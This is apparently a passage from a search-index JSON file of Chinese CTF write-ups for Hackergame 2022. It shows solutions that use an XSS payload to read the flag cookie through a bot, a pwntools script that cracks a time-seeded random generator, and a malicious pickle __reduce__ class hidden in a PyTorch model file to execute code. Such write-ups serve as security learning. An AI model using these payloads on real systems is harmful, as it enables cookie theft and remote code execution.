jnz\u3002\u4e4b\u540e Apply\u3001\u8fd0\u884c\u70b9\u51fb\u653e\u624b\u79bb\u5f00\u5373\u53ef\u8f93\u51fa flag\uff1a flag{Y0u_rea1ly_kn0w_Win32API_\u2026\u2026}","title":"Flag \u81ea\u52a8\u673a"},{"location":"writeups/hackergame2022/#_10","text":"\u8bf4\u5230\u4e0a\u56de\uff0c\u5c0f K \u5728\u83b7\u5f97\u4e86\u5b9e\u9a8c\u5ba4\u9ad8\u6027\u80fd\u670d\u52a1\u5668\u7684\u8bbf\u95ee\u6743\u9650\u4e4b\u540e\u5c31\u8fc1\u79fb\u4e86\u6570\u636e\uff08\u4ed6\u76f4\u5230\u73b0\u5728\u90fd\u8fd8\u4e0d\u77e5\u9053\u81ea\u5df1\u7684\u5bb6\u76ee\u5f55\u5907\u4efd\u88ab Eve \u4e0b\u8f7d\u4e86\uff09\u3002\u4e4b\u540e\uff0c\u4e3a\u4e86\u8dd1\u4e00\u4e9b\u522b\u4eba\u5199\u7684\u5728 Windows \u4e0b\u7684\u8ba1\u7b97\u7a0b\u5e8f\uff0c\u4ed6\u5b89\u88c5\u4e86 wine \u6765\u8fd0\u884c\u5b83\u4eec\u3002 \u300c\u4f60\u7528 wine \u8dd1 Windows \u7a0b\u5e8f\uff0c\u8981\u662f\u4e2d\u6bd2\u4e86\u548b\u529e\uff1f\u300d \u300c\u6ca1\u5173\u7cfb\uff0c\u5927\u4e0d\u4e86\u628a wineprefix \u5220\u4e86\u5c31\u884c\u3002\u6211\u8bbe\u7f6e\u8fc7\u4e86\u78c1\u76d8\u6620\u5c04\uff0cWindows \u7a0b\u5e8f\u662f\u8bfb\u4e0d\u5230\u6211\u7684\u6587\u4ef6\u7684\uff01\u300d \u4f46\u679c\u771f\u5982\u6b64\u5417\uff1f \u4e3a\u4e86\u9a8c\u8bc1\u8fd9\u4e00\u70b9\uff0c\u4f60\u9700\u8981\u70b9\u51fb\u300c\u6253\u5f00/\u4e0b\u8f7d\u9898\u76ee\u300d\u6309\u94ae\uff0c\u4e0a\u4f20\u4f60\u7684\u7a0b\u5e8f\u5b9e\u73b0\u4ee5\u4e0b\u7684\u76ee\u7684\uff1a /flag1 \u653e\u7f6e\u4e86\u7b2c\u4e00\u4e2a flag\u3002\u4f60\u80fd\u7ed9\u51fa\u4e00\u4e2a\u80fd\u5728 wine \u4e0b\u8fd0\u884c\u7684 x86_64 \u67b6\u6784\u7684 Windows \u547d\u4ee4\u884c\u7a0b\u5e8f\u6765\u8bfb\u53d6\u5230\u7b2c\u4e00\u4e2a flag \u5417\uff1f /flag2 \u653e\u7f6e\u4e86\u7b2c\u4e8c\u4e2a flag\uff0c\u4f46\u662f\u9700\u8981\u4f7f\u7528 /readflag \u7a0b\u5e8f\u624d\u80fd\u770b\u5230 /flag2 \u7684\u5185\u5bb9\u3002\u4f60\u80fd\u7ed9\u51fa\u4e00\u4e2a\u80fd\u5728 wine \u4e0b\u8fd0\u884c\u7684 x86_64 \u67b6\u6784\u7684 Windows \u547d\u4ee4\u884c\u7a0b\u5e8f\u6765\u6267\u884c /readflag \u7a0b\u5e8f\u6765\u8bfb\u53d6\u5230\u7b2c\u4e8c\u4e2a flag \u5417\uff1f \u7b2c\u4e00\u4e2a flag \u4e5f\u5f88\u7b80\u5355\uff0c\u76f4\u63a5\u8bfb\u53d6 /flag1 \u8f93\u51fa\u5c31\u53ef\u4ee5\u4e86\u3002 \u7b2c\u4e8c\u4e2a flag \u641e\u7684\u65f6\u5019\u8bd5\u8fc7 system\u3001execl \u5565\u7684\uff0c\u4e00\u4e9b\u547d\u4ee4\u90fd\u6ca1\u529e\u6cd5\u6267\u884c\uff0c\u4e0d\u77e5\u9053\u8be5\u600e\u4e48\u529e\uff0c\u4e0d\u60f3\u7814\u7a76\u4e86\uff0c\u5f00\u6446","title":"\u676f\u7a97\u9e45\u5f71"},{"location":"writeups/hackergame2022/#_11","text":"\u5c0f X \u4f5c\u4e3a\u67d0\u95e8\u7b26\u53f7\u8ba1\u7b97\u8bfe\u7a0b\u7684\u52a9\u6559\uff0c\u4e3a\u4e86\u8ba9\u5927\u5bb6\u719f\u6089\u8f6f\u4ef6\u7684\u4f7f\u7528\uff0c\u4ed6\u5199\u4e86\u4e00\u4e2a\u5c0f\u7f51\u7ad9\uff1a\u4e0a\u9762\u653e\u7740\u4e94\u9053\u7b80\u5355\u7684\u9898\u76ee\uff0c\u53ea\u8981\u8f93\u5165\u59d3\u540d\u548c\u9898\u76ee\u7b54\u6848\uff0c\u63d0\u4ea4\u540e\u5c31\u53ef\u4ee5\u770b\u5230\u81ea\u5df1\u7684\u5206\u6570\u3002 \u70b9\u51fb\u6b64\u94fe\u63a5\u8bbf\u95ee\u7ec3\u4e60\u7f51\u7ad9\uff08\u6ca1\u94fe\u63a5\uff09 \u60f3\u8d77\u81ea\u5df1\u524d\u51e0\u5929\u5728\u516c\u4f17\u53f7\u4e0a\u5b66\u8fc7\u7684 Java \u8bbe\u8ba1\u6a21\u5f0f\u514d\u8d39\u8bd5\u542c\u8bfe\uff0c\u672c\u7740\u524d\u540e\u7aef\u79bb\u5fc3\uff08\u54a6\uff1f\u662f\u524d\u540e\u7aef\u79bb\u5fc3\u5417\uff1f\u8fd8\u662f\u79bb\u5a5a\uff1f\u79bb\u3002\u3002\u79bb\u8c31\uff1f\u603b\u4e4b\u628a\u529f\u80fd\u80fd\u62c6\u5219\u62c6\u5c31\u5bf9\u5566\uff09\u7684\u601d\u60f3\uff0c\u5c0f X \u8fd8\u5355\u72ec\u5199\u4e86\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u6b22\u8fce\u540c\u5b66\u4eec\u628a\u81ea\u5df1\u7684\u6210\u7ee9\u94fe\u63a5\u63d0\u4ea4\u4e0a\u6765\u3002 \u603b\u4e4b\uff0c\u56e0\u4e3a\u5176\u5148\u8fdb\u7684\u8bbe\u8ba1\u601d\u60f3\uff0c\u9700\u8981\u540c\u5b66\u4eec\u505a\u5b8c\u7ec3\u4e60\u4e4b\u540e\u624b\u52a8\u628a\u6210\u7ee9\u8fde\u63a5\u8d34\u5230\u8fd9\u91cc\u6765\uff1a \u70b9\u51fb\u6b64\u94fe\u63a5\u63d0\u4ea4\u7ec3\u4e60\u6210\u7ee9 URL\uff08\u6ca1\u94fe\u63a5\uff09 \u70b9\u8fdb\u7b2c\u4e00\u4e2a\u94fe\u63a5\uff0c\u968f\u4fbf\u505a\u4e00\u904d\uff0c\u5f97\u5230\u6210\u7ee9\u5206\u4eab\u9875\u9762 /share?result=... \uff0c\u7136\u540e\u5c06\u94fe\u63a5\u8d34\u5230\u7b2c\u4e8c\u4e2a\u94fe\u63a5\u91cc\uff0c\u4f1a\u81ea\u52a8\u8bfb\u53d6\u51fa\u540d\u5b57\u548c\u6210\u7ee9\u3002 \u8bfb\u53d6\u7684\u8fc7\u7a0b\u662f\u7528 selenium \u6253\u5f00\u4e00\u4e2a\u6d4f\u89c8\u5668\uff0cGET login \u7136\u540e\u5c06 flag \u653e\u5165 cookie\uff0c\u5728 GET \u8f93\u5165\u7684 url\uff08\u4f1a\u66ff\u6362\u6389 netloc \u4e3a web\uff0cscheme \u4e3a http\uff09\uff0c\u7136\u540e\u8bfb\u53d6 #greeting \u548c #score \u7684\u5185\u5bb9\u3002 \u518d\u770b\u7b2c\u4e00\u4e2a\u94fe\u63a5\uff0c\u5176 result \u662f\u53ef\u4ee5\u6784\u9020\u7684\uff0c\u76f8\u5173\u903b\u8f91\uff1a const queryString = window . location . search ; const urlParams = new URLSearchParams ( queryString ); const result = urlParams . get ( 'result' ); const b64decode = atob ( result ); const colon = b64decode . indexOf ( \":\" ); const score = b64decode . substring ( 0 , colon ); const username = b64decode . substring ( colon + 1 ); document . querySelector ( \"#greeting\" ). innerHTML = \"\u60a8\u597d\uff0c\" + username + \"\uff01\" ; document . querySelector ( \"#score\" ). innerHTML = \"\u60a8\u5728\u7ec3\u4e60\u4e2d\u83b7\u5f97\u7684\u5206\u6570\u4e3a <b>\" + score + \"</b>/100\u3002\" ; \u4e5f\u5c31\u662f\u5c06 result base64 \u89e3\u7801\uff0c: \u524d\u9762\u7684\u4e3a\u5206\u6570\uff0c\u540e\u9762\u7684\u4e3a\u7528\u6237\u540d\uff0c\u7136\u540e\u586b\u5199\u8fdb\u53bb\u3002\u8fd9\u91cc\u5c31\u53ef\u4ee5\u8fdb\u884c xss\u3002\u6ca1\u5b66\u8fc7 xss\uff0c\u6240\u4ee5\u60f3\u4e86\u534a\u5929\u63d2\u5165\u4e00\u4e2a script tag \u4e4b\u540e\u600e\u4e48\u8ba9\u5904\u5728\u524d\u9762\u7684\u5b83\u88ab\u8fd0\u884c\uff0c\u540e\u6765\u641c\u4e86\u641c\u624d\u77e5\u9053\u53ef\u4ee5\u5229\u7528 onload onerror \u8fd9\u4e9b\u4e8b\u4ef6\u6765\u586b\u5199\u811a\u672c\u3002 \u6240\u4ee5 payload \u5c31\u662f 100:<img src=1 onerror=\"document.querySelector('#greeting').innerHTML=document.cookie\"> \uff0c\u7136\u540e base64 \u540e\u4f5c\u4e3a result \u4f20\u5165\uff0c\u518d\u4e22\u7ed9\u7b2c\u4e8c\u4e2a\u63d0\u4ea4\u94fe\u63a5\uff0c\u5f97\u5230 flag\uff1a flag{xS5_1OI_is_N0t_SOHARD_3c97784c1a}","title":"\u5fae\u79ef\u5206\u8ba1\u7b97\u5c0f\u7ec3\u4e60"},{"location":"writeups/hackergame2022/#_12","text":"\u8fd9\u4e2a\u4f30\u7b97\u5706\u5468\u7387\u7684\u7ecf\u5178\u7b97\u6cd5\u4f60\u4e00\u5b9a\u542c\u8bf4\u8fc7\uff1a\u5f80\u4e00\u4e2a 1x1 \u5927\u5c0f\u7684\u65b9\u683c\u91cc\u968f\u673a\u6492 N \u4e2a\u70b9\uff0c\u7edf\u8ba1\u843d\u5728\u4ee5\u65b9\u683c\u67d0\u4e2a\u9876\u70b9\u4e3a\u5706\u5fc3\u30011 \u4e3a\u534a\u5f84\u7684 1/4 \u6247\u5f62\u533a\u57df\u4e2d\u6492\u843d\u7684\u70b9\u6570\u4e3a M\uff0c\u90a3\u4e48 M/N \u5c31\u5c06\u63a5\u8fd1\u4e8e \u03c0/4 \u3002 \u5f53\u7136\uff0c\u8fd9\u662f\u4e00\u4e2a\u6982\u7387\u6027\u7b97\u6cd5\uff0c\u5982\u679c\u60f3\u5f97\u5230\u66f4\u7cbe\u786e\u7684\u503c\uff0c\u5c31\u9700\u8981\u6492\u66f4\u591a\u7684\u70b9\u3002\u7531\u4e8e\u6492\u70b9\u662f\u968f\u673a\u7684\uff0c\u81ea\u7136\u4e5f\u65e0\u6cd5\u9884\u6d4b\u67d0\u6b21\u6492\u70b9\u5b9e\u9a8c\u5f97\u5230\u7684\u7ed3\u679c\u5230\u5e95\u662f\u591a\u5c11\u2014\u2014\u4f46\u771f\u7684\u662f\u8fd9\u6837\u5417\uff1f \u6709\u4f4d\u597d\u4e8b\u4e4b\u5f92\u51b3\u5b9a\u501f\u6b64\u548c\u4f60\u6765\u4e00\u573a\u8f6e\u76d8\u8d4c\uff1a\u6492 40 \u4e07\u4e2a\u70b9\u8ba1\u7b97\u5706\u5468\u7387\uff0c\u800c\u4f60\u9700\u8981\u731c\u6d4b\u5b9e\u9a8c\u7684\u7ed3\u679c\u7cbe\u786e\u5230\u5c0f\u6570\u70b9\u540e\u4e94\u4f4d\u3002\u4e3a\u4e86\u9632\u6b62\u8fd0\u6c14\u592a\u597d\u78b0\u5de7\u731c\u4e2d\uff0c\u4f60\u4eec\u7ea6\u5b9a\u4e94\u5c40\u4e09\u80dc\u3002 \u770b\u8d77\u6765\u6ca1\u4ec0\u4e48\u5176\u5b83\u6f0f\u6d1e\uff0c\u4ece\u4f2a\u968f\u673a\u5165\u624b\uff0c\u8bbe\u7f6e\u7684\u968f\u673a\u79cd\u5b50\u4e3a time(0)+clock()\uff0c\u4e5f\u5c31\u662f\u5f53\u524d\u65f6\u95f4\u6233\u52a0\u4e0a\u7a0b\u5e8f\u8fd0\u884c\u5230\u6b64\u5904\u7684 ticks \u6570\u3002\u65f6\u95f4\u6233\u4ee5\u79d2\u4e3a\u5355\u4f4d\uff0c\u6ce2\u52a8\u4e0d\u5927\uff0c\u76f4\u63a5\u4f7f\u7528\u8fde\u63a5\u65f6\u7684\u65f6\u95f4\u6233\u5c31\u53ef\u4ee5\u3002clock() \u4f1a\u6709\u8f83\u5927\u6ce2\u52a8\uff0c\u4ece 0 \u5f00\u59cb\u679a\u4e3e\uff0c\u5c06\u5f97\u5230\u7684\u503c\u4f20\u5165\u4e00\u4e2a C \u7a0b\u5e8f\u4e2d\u4f5c\u4e3a\u968f\u673a\u79cd\u5b50\uff0c\u6a21\u62df\u4e00\u4e0b\uff0c\u770b\u4e00\u770b\u524d\u4e24\u4e2a\u662f\u5426\u80fd\u548c\u6b63\u786e\u7ed3\u679c\u5bf9\u4e0a\u3002\u80fd\u5bf9\u4e0a\u5219\u8bf4\u660e\u968f\u673a\u79cd\u5b50\u627e\u5bf9\u4e86\uff0c\u5c06\u540e\u4e09\u4e2a\u7ed3\u679c\u8f93\u56de\u53bb\u5373\u53ef\u5b8c\u6210\u3002 import time import subprocess from tqdm import tqdm from pwn import * # p = process('./challenge') p = remote ( \"202.38.93.111\" , 10091 ) token = \"...\" p . sendlineafter ( b \": \" , token . encode ()) timestamp = int ( time . time ()) def crack_seed ( res1 , res2 ): for clock in tqdm ( range ( 0 , 9000 )): seed = timestamp + clock cracker = subprocess . run ( [ \"./exp\" , str ( seed )], stdout = subprocess . PIPE , ) res = cracker . stdout . decode () . strip () . split ( ' \\n ' ) if res [ 0 ] == str ( res1 ) and res [ 1 ] == str ( res2 ): print ( seed ) return res seed = timestamp - clock cracker = subprocess . run ( [ \"./exp\" , str ( seed )], stdout = subprocess . PIPE , ) res = cracker . stdout . decode () . strip () . split ( ' \\n ' ) if res [ 0 ] == str ( res1 ) and res [ 1 ] == str ( res2 ): print ( seed ) return res exit ( 1 ) p . recvuntil ( \"\uff1a\" . encode ( \"utf-8\" )) p . sendline ( b '3.14159' ) win = p . recvline () . decode () . strip () if win == \"\u731c\u5bf9\u4e86\uff01\" : res1 = \"3.14159\" else : p . recvuntil ( \"\uff1a\" . encode ( \"utf-8\" )) res1 = p . recvline () . decode () . strip () p . recvuntil ( \"\uff1a\" . encode ( \"utf-8\" )) p . sendline ( b '3.14159' ) win = p . recvline () . decode () . strip () if win == \"\u731c\u5bf9\u4e86\uff01\" : res2 = \"3.14159\" else : p . recvuntil ( \"\uff1a\" . encode ( \"utf-8\" )) res2 = p . recvline () . decode () . strip () print ( res2 ) res = crack_seed ( res1 , res2 ) p . recvuntil ( \"\uff1a\" . encode ( \"utf-8\" )) p . sendline ( res [ 2 ] . encode ( \"utf-8\" )) p . recvuntil ( \"\uff1a\" . encode ( \"utf-8\" )) p . sendline ( res [ 3 ] . encode ( \"utf-8\" )) p . recvuntil ( \"\uff1a\" . encode ( \"utf-8\" )) p . sendline ( res [ 4 ] . encode ( \"utf-8\" )) p . interactive () \u8fd0\u884c\u5f97\u5230 flag\uff1a flag{raNd0m_nUmb34_a1wayS_m4tters_\u2026\u2026} \u54e6\u5bf9\u4e86\uff0c\u6709\u4e00\u4e2a\u5f88\u5751\u7684\u70b9\u662f mac \u4e0a\u7684 gcc \u5176\u5b9e\u662f clang \u7684 alias\uff0c\u800c clang \u548c gcc \u7684\u968f\u673a\u6570\u6709\u533a\u522b\uff0c\u5728 mac \u4e0a\u8dd1\u7684\u8bdd\u5c31\u4e00\u76f4\u7206\u4e0d\u51fa\u6765\u79cd\u5b50\u3002\u5728 Linux \u4e0a\u5c31\u53ef\u4ee5\u4e00\u4e0b\u7206\u51fa\u6765\u3002","title":"\u8499\u7279\u5361\u7f57\u8f6e\u76d8\u8d4c"},{"location":"writeups/hackergame2022/#_13","text":"\u5929\u51b7\u6781\u4e86\uff0c\u4e0b\u7740\u96ea\uff0c\u53c8\u5feb\u9ed1\u4e86\u3002\u8fd9\u662f\u4e00\u5e74\u7684\u6700\u540e\u4e00\u5929\u2014\u2014\u5927\u5e74\u591c\u3002\u5728\u8fd9\u53c8\u51b7\u53c8\u9ed1\u7684\u665a\u4e0a\uff0c\u4e00\u4e2a\u6ca1\u6709 GPU\u3001\u6ca1\u6709 TPU \u7684\u5c0f\u5973\u5b69\uff0c\u5728\u8857\u4e0a\u7f13\u7f13\u5730\u8d70\u7740\u3002\u5979\u4ece\u5bb6\u91cc\u51fa\u6765\u7684\u65f6\u5019\u8fd8\u5e26\u7740\u6361\u5783\u573e\u6361\u6765\u7684 E3 \u5904\u7406\u5668\uff0c\u4f46\u662f\u6709\u4ec0\u4e48\u7528\u5462\uff1f\u8dd1\u4e0d\u52a8 Stable Diffusion\uff0c\u4e5f\u8dd1\u4e0d\u52a8 NovelAI\u3002\u5979\u4e5f\u60f3\u7528\u81ea\u5df1\u7684\u5904\u7406\u5668\u8bad\u7ec3\u4e00\u4e2a\u795e\u7ecf\u7f51\u7edc\uff0c\u751f\u6210\u4e00\u4e9b\u4e8c\u6b21\u5143\u7684\u56fe\u7247\u3002 \u4e8e\u662f\u5979\u914d\u7f6e\u597d\u4e86 PyTorch 1.9.1\uff0c\u5b9a\u4e49\u4e86\u4e00\u4e2a\u6781\u5176\u7b80\u5355\u7684\u6a21\u578b\uff0c\u7528\u81ea\u5df1\u6536\u96c6\u7684 10 \u5f20\u4e8c\u6b21\u5143\u56fe\u7247\u548c\u5bf9\u5e94\u7684\u6807\u7b7e\u5f00\u59cb\u4e86\u8bad\u7ec3\u3002 \u5979\u5728 CPU \u4e0a\u5f00\u59cb\u4e86\u7b2c\u4e00\u4e2a epoch \u7684\u8bad\u7ec3\uff0closs \u4e00\u76f4\u5728\u4e0b\u964d\uff0c\u8bb8\u591a\u4e8c\u6b21\u5143\u56fe\u7247\u91cd\u53e0\u5728\u4e00\u8d77\uff0c\u5728\u5411\u5979\u7728\u773c\u775b\u3002 \u5979\u53c8\u5f00\u59cb\u4e86\u7b2c\u4e8c\u4e2a epoch\uff0closs \u8d8a\u6765\u8d8a\u4f4e\uff0c\u56fe\u7247\u8d8a\u6765\u8d8a\u7cbe\u7f8e\uff0c\u5979\u7684\u773c\u775b\u4e5f\u8d8a\u6765\u8d8a\u7d2f\uff0c\u5979\u7684\u773c\u775b\u5f00\u59cb\u95ed\u4e0a\u4e86\u3002 ... \u7b2c\u4e8c\u5929\u6e05\u6668\uff0c\u8fd9\u4e2a\u5c0f\u5973\u5b69\u5750\u5728\u5899\u89d2\u91cc\uff0c\u4e24\u816e\u901a\u7ea2\uff0c\u5634\u4e0a\u5e26\u7740\u5fae\u7b11\u3002\u65b0\u5e74\u7684\u592a\u9633\u5347\u8d77\u6765\u4e86\uff0c\u7167\u5728\u5979\u5c0f\u5c0f\u7684\u5c38\u4f53\u4e0a\u3002 \u4eba\u4eec\u53d1\u73b0\u5979\u65f6\u624d\u77e5\u9053\uff0c\u5979\u7684\u6a21\u578b\u5728 10 \u5f20\u56fe\u7247\u4e0a\u8fc7\u62df\u5408\u4e86\uff0c\u51e0\u4e4e\u6ca1\u6709\u8bef\u5dee\u3002 \uff08\u5b8c\uff09 \u542c\u5b8c\u8fd9\u4e2a\u6545\u4e8b\uff0c\u4f60\u4e00\u8138\u7684\u4e0d\u76f8\u4fe1\uff1a\u300c\u8fd9\u4e48\u7b80\u5355\u7684\u6a21\u578b\u600e\u4e48\u53ef\u80fd\u6ca1\u6709\u8bef\u5dee\u5462\uff1f\u300d\uff0c\u4e8e\u662f\u4f60\u5f00\u59cb\u590d\u73b0\u8fd9\u4e2a\u4e8c\u6b21\u5143\u795e\u7ecf\u7f51\u7edc\u3002 \u76ee\u6807\u770b\u8d77\u6765\u5c31\u662f\u8ba9\u6a21\u578b\u751f\u6210\u7684\u56fe\u7247\u548c\u9884\u671f\u51e0\u4e4e\u6ca1\u6709\u8bef\u5dee\u3002\u8bd5\u7740\u591a\u8bad\u7ec3\u51e0\u8f6e\uff0c\u8bd5\u56fe\u8fc7\u62df\u5408\uff0c\u8bb0\u5f55\u4e00\u4e0b loss\uff0c\u53d1\u73b0\u964d\u5230 0.001+ \u7684\u65f6\u5019\u5c31\u964d\u4e0d\u4e0b\u53bb\u4e86\uff0c\u800c\u9700\u8981\u7684\u662f 0.0005 \u770b\u8d77\u6765\u4e0d\u53ef\u884c\u3002\u800c\u4e14\u8fd9\u662f\u4e00\u9053 web \u7c7b\u9898\uff0c\u8003\u8651\u7528\u4e00\u4e9b\u624b\u6bb5\u6765\u8ba9\u5b83\u8ba4\u4e3a\u6211\u7684\u8f93\u51fa\u662f\u5b8c\u5168\u6b63\u786e\u7684\u3002 \u641c\u7d22\u53ef\u4ee5\u53d1\u73b0\u5b58\u7684 .pt \u6587\u4ef6\u4e2d\u6709\u4f7f\u7528 pickle \u5e8f\u5217\u5316\u5b58\u50a8\u7684 .pkl \u6587\u4ef6\u3002\u800c\u5728\u8bfb\u53d6\u7684\u65f6\u5019\u4e5f\u4f1a\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\uff0c\u8fd9\u4e5f\u5c31\u5b58\u5728\u4e00\u4e2a pickle \u53cd\u5e8f\u5217\u5316\u7684\u6f0f\u6d1e\u3002 \u6211\u4eec\u53ef\u4ee5\u81ea\u5df1\u5199\u4e00\u4e2a\u6076\u610f\u7c7b\u7136\u540e\u6253\u5305\u5230 data.pkl \u538b\u7f29\u8fdb .pt \u6587\u4ef6\uff0c\u5728\u53cd\u5e8f\u5217\u5316\u7684\u65f6\u5019\u5c31\u4f1a\u6267\u884c\u5176\u4e2d\u7684\u4ee3\u7801\uff0c\u6bd4\u5982\uff1a class Exploit ( object ): def __reduce__ ( self ): return ( os . system , ( \"...\" , )) \u8fd9\u4e2a\u5728\u672c\u5730\u6d4b\u8bd5\u7684\u65f6\u5019\u8fd0\u884c infer.py \u53ef\u4ee5\u6253\u901a\uff0c\u4f46\u8fdc\u7a0b\u5c31\u4e0d\u53ef\u4ee5\u3002\u6240\u4ee5\u53ef\u4ee5\u731c\u6d4b\u8fdc\u7a0b\u5b9e\u9645\u4e0a\u4ece\u5176\u5b83\u6a21\u5757\u4e2d\u8c03\u7528\u4e86 infer \u51fd\u6570\uff0c\u5982\u679c\u6ca1\u6709\u6b63\u5e38\u8fd4\u56de\uff0c\u5219\u4f1a\u62a5\u9519\u3002 \u90a3\u4e48\u6211\u4eec\u7684\u601d\u8def\u5c31\u662f\u8ba9\u6574\u4e2a\u7a0b\u5e8f\u90fd\u53ef\u4ee5\u6b63\u5e38\u8fd0\u884c\uff0c\u53ea\u662f\u5728\u53cd\u5e8f\u5217\u5316\u7684\u65f6\u5019\u8fdb\u884c\u4e00\u4e9b\u64cd\u4f5c\u3002\u6839\u636e\u6e90\u7801\u53ef\u4ee5\u77e5\u9053\u6700\u7ec8\u4f1a\u5c06\u6a21\u578b\u8f93\u51fa\u7684\u7ed3\u679c\u5b58\u653e\u5728 /tmp/result.json \u4e2d\uff0c\u7136\u540e\u5728\u5176\u5b83\u4f4d\u7f6e\u518d\u8bfb\u53d6\u8fd9\u4e2a\u6587\u4ef6\uff0c\u8fdb\u884c\u5224\u65ad\u3002\u800c\u5982\u679c\u6ca1\u6709\u8fd9\u4e2a\u6587\u4ef6\u5219\u4f1a\u76f4\u63a5\u62a5\u9519\u3002 \u6240\u4ee5\u53ef\u4ee5\u5728 reduce \u4e2d\u5c06\u5b8c\u5168\u6b63\u786e\u7684\u7ed3\u679c\u5148\u5199\u5165 /tmp/result.json \u4e2d\u3002\u4f46\u5982\u679c\u8fd9\u65f6\u76f4\u63a5 exit\uff0c\u5219\u540e\u9762\u7a0b\u5e8f\u65e0\u6cd5\u6267\u884c\uff0c\u4f1a\u51fa\u73b0\u62a5\u9519\u3002\u6240\u4ee5\u8fd8\u9700\u8981\u8ba9\u540e\u9762\u5b8c\u5168\u6b63\u5e38\u8fd0\u884c\u3002\u6574\u4e2a infer \u51fd\u6570\u7684\u903b\u8f91\u5927\u6982\u5982\u4e0b\uff1a def infer ( pt_file ): # ... model = SimpleGenerativeModel ( n_tags = n_tags , dim = dim , img_shape = img_shape ) model . load_state_dict ( torch . load ( pt_file , map_location = \"cpu\" )) # ... predict json . dump ({ \"gen_imgs_b64\" : gen_imgs }, open ( \"/tmp/result.json\" , \"w\" )) \u6211\u4eec\u8f93\u5165\u7684 pt \u6587\u4ef6\u4f1a\u5728 torch.load \u4e2d\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\uff0c\u8fd9\u65f6\u4f1a\u5199\u5165 /tmp/result.json\u3002\u800c\u540e\u9762\u5bf9\u4e8e\u6211\u4eec\u5199\u5165\u7684\u5a01\u80c1\u5c31\u662f\u8fd8\u4f1a json.dump \u4e00\u6b21\u3002\u6240\u4ee5\u9996\u5148\u9700\u8981\u5c06 json.dump \u8fd9\u4e2a\u51fd\u6570\u7684\u4f5c\u7528\u62b9\u9664\u6389\uff1a __import__('json').dump=lambda x, y: 0 \u3002\u4f46\u8fd9\u8fd8\u4e0d\u591f\uff0c\u56e0\u4e3a\u53c2\u6570\u4e2d\u7684 open \u4e5f\u4f1a\u6267\u884c\uff0c\u4ee5 w \u65b9\u5f0f\u6253\u5f00\u6587\u4ef6\u7684\u8bdd\u4f1a\u5148\u76f4\u63a5\u6e05\u7a7a\u6587\u4ef6\uff0c\u6240\u4ee5\u4e5f\u9700\u8981\u62b9\u6389 open \u7684\u4f5c\u7528\u3002\u4e0d\u8fc7\u540e\u9762\u80af\u5b9a\u8fd8\u4f1a\u9700\u8981\u4f7f\u7528 open \u6765\u8bfb\u53d6\u6587\u4ef6\uff0c\u6240\u4ee5\u53ea\u80fd\u62b9\u6389\u5199\u5165\u7684\u90e8\u5206\uff1a __builtins__['_open'] = open; __builtins__['open']=lambda x, y: 0 if y=='w' else __builtins__['_open'](x, y) \u3002 \u8fd9\u6837\u6765\u8bb2\u6211\u4eec\u7684 exp \u5c31\u662f\uff1a class Exploit ( object ): def __reduce__ ( self ): text = '{\"gen_imgs_b64\": [\"......' return ( exec , ( f \"open('/tmp/result.json', 'w').write(' { text } ');\" \"__import__('json').dump=lambda x, y: 0;\" \"__builtins__['_open']=open;\" \"__builtins__['open']=lambda x, y: 0 if y=='w' else __builtins__['_open'](x, y)\" , )) \u4f46\u4ec5\u5c06\u8fd9\u4e2a\u6253\u5305\u540e\u5f97\u5230\u7684 data.pkl \u76f4\u63a5\u538b\u7f29\u8fdb pt \u6587\u4ef6\u8fd8\u662f\u4e0d\u884c\u3002\u56e0\u4e3a\u6a21\u578b\u5c31\u6ca1\u6cd5\u6b63\u5e38\u8bfb\u53d6\u4e86\uff0c\u6240\u4ee5\u8fd8\u9700\u8981\u5bf9\u5176\u8fdb\u884c\u4e00\u4e9b\u4fee\u6539\u3002 pkl \u6587\u4ef6\u5b9e\u9645\u5b58\u50a8\u7684\u662f\u4e00\u4e2a\u6784\u9020\u597d\u7684\u865a\u62df\u673a\u6307\u4ee4\uff0cpickle \u53cd\u5e8f\u5217\u5316\u65f6\u4f1a\u6267\u884c\u5b83\u3002\u770b\u6e90\u7801\u53ef\u4ee5\u4e86\u89e3\u5230\u6709\u4e00\u4e2a\u6307\u4ee4 0x2E \u8868\u793a\u4e86\u7ed3\u675f\u8fd4\u56de\u3002\u6240\u4ee5\u76f4\u63a5\u5c06\u751f\u6210\u7684 data.pkl \u672b\u5c3e\u7684 0x2E \u53bb\u6389\uff0c\u7136\u540e\u76f4\u63a5\u63a5\u4e0a\u4e00\u4efd\u6b63\u786e\u7684 data.pkl \u5185\u5bb9\u5373\u53ef\u5b8c\u6210\u6784\u9020\u3002 \u6784\u9020\u597d\u540e\u4e0a\u4f20 pt \u6587\u4ef6\uff0c\u5373\u53ef\u8fbe\u5230\u76ee\u6807\u5f97\u5230 flag\uff1a flag{Torch.Load.Is.Dangerous-\u2026\u2026}","title":"\u4e8c\u6b21\u5143\u795e\u7ecf\u7f51\u7edc"},{"location":"writeups/hackergame2022/#_14","text":"\u5192\u9669\uff0c\u5c31\u8981\u4e0d\u65ad\u5411\u524d\uff01 \u5728\u5bc2\u9759\u7684\u795e\u79d8\u661f\u7403\u4e0a\uff0c\u7ee7\u7eed\u524d\u8fdb\uff0c\u63a2\u5bfb flag \u7684\u5965\u79d8\u5427\uff01 \u6253\u5f00\u53d1\u73b0\u662f\u4e00\u4e2a WebGL \u6e32\u67d3\u7684\u573a\u666f\uff0c\u5176\u4e2d flag \u7684\u5185\u5bb9\u88ab\u6321\u4f4f\u4e86\u3002\u6240\u6709\u5185\u5bb9\u90fd\u662f\u5728\u524d\u7aef\u7684\uff0c\u5b58\u4e0b\u6765\u5c31\u53ef\u4ee5\u672c\u5730\u8c03\u8bd5\u3002 \u53d1\u73b0\u5176\u4e2d\u7684\u4e3b\u8981\u573a\u666f\u6e32\u67d3\u4ee3\u7801\u90fd\u5728 fragment-shader.js \u4e2d\u3002\u53ef\u4ee5\u53d1\u73b0\u7531\u4e00\u4e9b sdf \u7ec4\u6210\uff0c\u6700\u7ec8\u7684\u573a\u666f\u4e5f\u662f\u7531\u51e0\u4e2a sdf \u7ed3\u679c\u53d6 min \u800c\u6765\u7684\u3002 \u770b\u8d77\u6765 t5SDF \u7684\u4ee3\u7801\u6700\u77ed\uff0c\u53ef\u80fd\u662f\u65bd\u52a0\u7684\u906e\u76d6\u3002\u6240\u4ee5\u5c06 sceneSDF \u4e2d t5 \u76f8\u5173\u7684\u90e8\u5206\u5220\u6389\uff0c\u518d\u6253\u5f00\u9875\u9762\u8fd0\u884c\u5373\u53ef\u770b\u5230\u5b8c\u6574 flag\uff1a 